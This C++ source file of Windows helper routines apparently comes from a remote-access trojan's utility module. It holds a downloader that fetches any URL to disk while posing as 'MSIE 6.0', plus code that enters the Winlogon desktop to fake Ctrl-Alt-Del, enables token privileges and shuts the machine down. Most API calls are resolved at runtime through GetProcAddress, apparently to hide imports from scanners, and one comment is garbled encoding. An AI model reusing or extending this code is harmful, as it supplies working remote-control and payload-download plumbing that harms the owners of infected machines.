#include "stdafx.h"
#include <windows.h>
#include <process.h>
#include <tlhelp32.h>
#include <wininet.h>
#include <tchar.h>
#include "until.h"

#define DWORD_PTR DWORD

inline unsigned long WINAPI _beginthreadex_EX(void* security,
	unsigned stack_size,
	unsigned(__stdcall *start_address)(void*),
	void* arglist,
	unsigned initflag,
	unsigned* thrdaddr)
{
	HANDLE NewThread;

	/*
	 * Just call the API function. Any CRT specific processing is done in
	 * DllMain DLL_THREAD_ATTACH
	 */
	NewThread = CreateThread((LPSECURITY_ATTRIBUTES)security, stack_size,
		(LPTHREAD_START_ROUTINE)start_address,
		arglist, initflag, (PULONG)thrdaddr);

	return (unsigned long)NewThread;
}

unsigned int __stdcall ThreadLoader(LPVOID param)
{
	unsigned int	nRet = 0;
	__try
	{
		THREAD_ARGLIST	arg;
		memcpy(&arg, param, sizeof(arg));
		SetEvent(arg.hEventTransferArg);
		// Óë×¿Ãæ½»»¥
		if (arg.bInteractive)
			SelectDesktop(NULL);

		nRet = arg.start_address(arg.arglist);
	}
	__except (1) {}

	return nRet;
}

HANDLE MyCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
	SIZE_T dwStackSize,                       // initial stack size
	LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
	LPVOID lpParameter,                       // thread argument
	DWORD dwCreationFlags,                    // creation option
	LPDWORD lpThreadId, bool bInteractive)
{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARGLIST	arg;
	arg.start_address = (unsigned(__stdcall *)(void *))lpStartAddress;
	arg.arglist = (void *)lpParameter;
	arg.bInteractive = bInteractive;
	arg.hEventTransferArg = CreateEvent(NULL, false, false, NULL);
	hThread = (HANDLE)_beginthreadex_EX((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);
	WaitForSingleObject(arg.hEventTransferArg, INFINITE);
	CloseHandle(arg.hEventTransferArg);

	return hThread;
}

DWORD GetProcessID(LPCTSTR lpProcessName)
{
	HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 info;
	info.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(handle, &info))
	{
		if (lstrcmpi(info.szExeFile, lpProcessName) == 0)
		{
			return  info.th32ProcessID;
		}

		typedef BOOL(WINAPI *PROC32)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
		PROC32  myProc32;
		HINSTANCE hdllv = GetModuleHandleW(L"Kernel32.dll");
		myProc32 = (PROC32)GetProcAddress(hdllv, "Process32Next");

		while (myProc32(handle, &info) != FALSE)
		{
			if (lstrcmpi(info.szExeFile, lpProcessName) == 0)
			{
				return info.th32ProcessID;
			}
		}
	}

	CloseHandle(handle);
	return -1;
}

bool SwitchInputDesktop()
{
	bool	bRet = false;
	DWORD	dwLengthNeeded;

	HDESK	hOldDesktop, hNewDesktop;
	TCHAR	strCurrentDesktop[256], strInputDesktop[256];

	HINSTANCE user32 = LoadLibraryW(L"user32.dll");

	typedef BOOL(WINAPI *STDP)(HDESK);
	STDP mySetThreadDesktop = (STDP)GetProcAddress(user32, "SetThreadDesktop");

	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(strCurrentDesktop, 0, sizeof(strCurrentDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME, &strCurrentDesktop, sizeof(strCurrentDesktop), &dwLengthNeeded);

	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(strInputDesktop, 0, sizeof(strInputDesktop));
	GetUserObjectInformation(hNewDesktop, UOI_NAME, &strInputDesktop, sizeof(strInputDesktop), &dwLengthNeeded);

	if (lstrcmpi(strInputDesktop, strCurrentDesktop) != 0)
	{
		mySetThreadDesktop(hNewDesktop);
		bRet = true;
	}
	CloseDesktop(hOldDesktop);

	CloseDesktop(hNewDesktop);

	if (user32)
		FreeLibrary(user32);

	return bRet;
}

BOOL SelectHDESK(HDESK new_desktop)
{
	HINSTANCE user32 = LoadLibraryW(L"user32.dll");

	typedef BOOL(WINAPI *STDP)(HDESK);
	STDP mySetThreadDesktop = (STDP)GetProcAddress(user32, "SetThreadDesktop");

	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());

	DWORD dummy;
	char new_name[256];

	if (!GetUserObjectInformation(new_desktop, UOI_NAME, &new_name, 256, &dummy))
	{
		return FALSE;
	}

	// Switch the desktop
	if (!mySetThreadDesktop(new_desktop))
	{
		return FALSE;
	}

	// Switched successfully - destroy the old desktop
	CloseDesktop(old_desktop);

	if (user32)
		FreeLibrary(user32);

	return TRUE;
}

// - SelectDesktop(char *)
// Switches the current thread into a different desktop, by name
// Calling with a valid desktop name will place the thread in that desktop.
// Calling with a NULL name will place the thread in the current input desktop.

BOOL WINAPI SelectDesktop(TCHAR name[])
{
	HDESK desktop;

	HINSTANCE user32 = LoadLibraryW(L"user32.dll");

	typedef HDESK(WINAPI *OID)(DWORD, BOOL, ACCESS_MASK);
	OID myOpenInputDesktop = (OID)GetProcAddress(user32, "OpenInputDesktop");

	if (name != NULL)
	{
		// Attempt to open the named desktop
		desktop = OpenDesktop(name, 0, FALSE,
			DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
			DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
	}
	else
	{
		// No, so open the input desktop
		desktop = myOpenInputDesktop(0, FALSE,
			DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
			DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
	}

	if (desktop == NULL)
	{
		return FALSE;
	}

	// Switch to the new desktop
	if (!SelectHDESK(desktop))
	{
		CloseDesktop(desktop);
		return FALSE;
	}

	if (user32) FreeLibrary(user32);

	return TRUE;
}

BOOL SimulateCtrlAltDel()
{
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());

	// Switch into the Winlogon desktop
	if (!SelectDesktop(_T("Winlogon")))
	{
		return FALSE;
	}

	// Fake a hotkey event to any windows we find there.... :(
	// Winlogon uses hotkeys to trap Ctrl-Alt-Del...
	PostMessage(HWND_BROADCAST, WM_HOTKEY, 0, MAKELONG(MOD_ALT | MOD_CONTROL, VK_DELETE));

	// Switch back to our original desktop
	if (old_desktop != NULL)
		SelectHDESK(old_desktop);

	return TRUE;
}

bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
{
	HINTERNET	hInternet = NULL, hUrl = NULL;
	HANDLE		hFile;
	TCHAR		buffer[1024];
	DWORD		dwBytesRead = 0;
	DWORD		dwBytesWritten = 0;
	bool		bRet = true;

	HINSTANCE hdllde = LoadLibraryW(L"wininet.dll");

	typedef HINTERNET(WINAPI *NETOPEN)(LPCTSTR lpszAgent, DWORD dwAccessType, LPCTSTR lpszProxyName, LPCTSTR lpszProxyBypass, DWORD dwFlags);

#ifdef UNICODE
	NETOPEN myNetOpen = (NETOPEN)GetProcAddress(hdllde, "InternetOpenW");
#else
	NETOPEN myNetOpen = (NETOPEN)GetProcAddress(hdllde, "InternetOpenA");
#endif

	hInternet = myNetOpen(_T("MSIE 6.0"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, INTERNET_INVALID_PORT_NUMBER, 0);

	if (hInternet == NULL)
		return false;

	typedef HINTERNET(WINAPI *NETOPENURL)(HINTERNET hInternet, LPCTSTR lpszUrl, LPCTSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);

#ifdef UNICODE
	NETOPENURL myNetOpenUrl = (NETOPENURL)GetProcAddress(hdllde, "InternetOpenUrlW");
#else
	NETOPENURL myNetOpenUrl = (NETOPENURL)GetProcAddress(hdllde, "InternetOpenUrlA");
#endif

	hUrl = myNetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);

	if (hUrl == NULL)
		return false;

	hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

	typedef BOOL(WINAPI *APIS)(HINTERNET hUrl, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
	APIS myapis;
	myapis = (APIS)GetProcAddress(hdllde, "InternetReadFile");

	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			memset(buffer, 0, sizeof(buffer));
			myapis(hUrl, buffer, sizeof(buffer), &dwBytesRead);

			WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
		} while (dwBytesRead > 0);

		CloseHandle(hFile);
	}

	typedef BOOL(WINAPI *NETCLOSE)(HINTERNET hInternet);
	NETCLOSE  myNetClose = (NETCLOSE)GetProcAddress(hdllde, "InternetCloseHandle");

	myNetClose(hUrl);
	myNetClose(hInternet);

	return bRet;
}

bool DebugPrivilege(const TCHAR *PName, BOOL bEnable)
{
	bool              bResult = TRUE;

	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;

	HINSTANCE advapi32 = LoadLibraryW(L"ADVAPI32.dll");

	typedef BOOL(WINAPI *OPT)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
	OPT myopt;
	myopt = (OPT)GetProcAddress(advapi32, "OpenProcessToken");

	if (!myopt(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	typedef BOOL(WINAPI *LPV)(LPCTSTR lpSystemName, LPCTSTR lpName, PLUID lpLuid);

#ifdef UNICODE
	LPV mylpv = (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueW");
#else
	LPV mylpv = (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueA");
#endif

	mylpv(NULL, PName, &TokenPrivileges.Privileges[0].Luid);

	typedef BOOL(WINAPI *ATP)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
	ATP myapt = (ATP)GetProcAddress(advapi32, "AdjustTokenPrivileges");

	myapt(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);
	if (advapi32)
		FreeLibrary(advapi32);

	return bResult;
}

void ShutdownWindows(DWORD dwReason)
{
	DebugPrivilege(SE_SHUTDOWN_NAME, TRUE);
	ExitWindowsEx(dwReason, 0);
}